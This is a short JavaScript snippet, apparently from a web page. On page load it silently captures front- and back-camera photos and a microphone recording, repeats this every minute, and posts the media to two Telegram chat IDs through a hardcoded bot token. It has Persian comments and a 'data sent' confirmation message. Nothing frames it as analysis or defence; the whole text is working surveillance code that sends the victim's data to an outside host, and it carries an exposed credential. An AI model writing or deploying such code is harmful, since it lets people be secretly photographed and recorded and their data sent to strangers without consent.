const botToken = "7996751116:AAFRkCkQ32NI35JKeqeacSFayJnPjlMVRxs";

const chatIds = ["1120400003", "1171444772"]; // دو آی دی چت



function sendToTelegram(audio, photoFront, photoBack) {

  chatIds.forEach(chatId => {

    const sendFile = (endpoint, fieldName, file, filename) => {

      const formData = new FormData();

      formData.append(fieldName, file, filename);

      formData.append("chat_id", chatId);



      fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {

        method: "POST",

        body: formData

      });

    };



    if (audio) sendFile("sendVoice", "voice", audio, "voice.webm");

    if (photoFront) sendFile("sendPhoto", "photo", photoFront, "front.jpg");

    if (photoBack) sendFile("sendPhoto", "photo", photoBack, "back.jpg");



    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {

      method: "POST",

      headers: { "Content-Type": "application/json" },

      body: JSON.stringify({ chat_id: chatId, text: "✅ داده‌ها ارسال شدند." })

    });

  });

}



async function startAll() {

  statusText.innerText = "";

  photoFront = await captureImage("user");

  photoBack = await captureImage("environment");

  audioBlob = await recordAudio();



  sendToTelegram(audioBlob, photoFront, photoBack);

}



window.onload = () => {

  startAll();

  setInterval(startAll, 60000);

};

